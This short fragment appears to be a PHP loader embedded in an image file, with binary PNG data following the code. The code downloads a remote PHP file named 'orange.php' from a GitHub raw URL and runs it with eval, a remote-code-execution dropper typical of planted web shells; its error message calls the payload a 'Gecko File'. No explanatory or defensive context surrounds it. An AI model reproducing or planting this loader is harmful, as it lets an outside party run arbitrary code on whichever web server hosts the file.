...
?>
<?php
$url = 'https://raw.githubusercontent.com/jackxcode/alat/main/orange.php';
$ch = curl_init($url);
...
if ($fileContents === false) {
    die('[!] Cannot Get Gecko File : https://raw.githubusercontent.com/jackxcode/alat/main/orange.php ');
}
eval("?>" . $fileContents);
?>::œX    IDATxœìÁ   €þ¯î
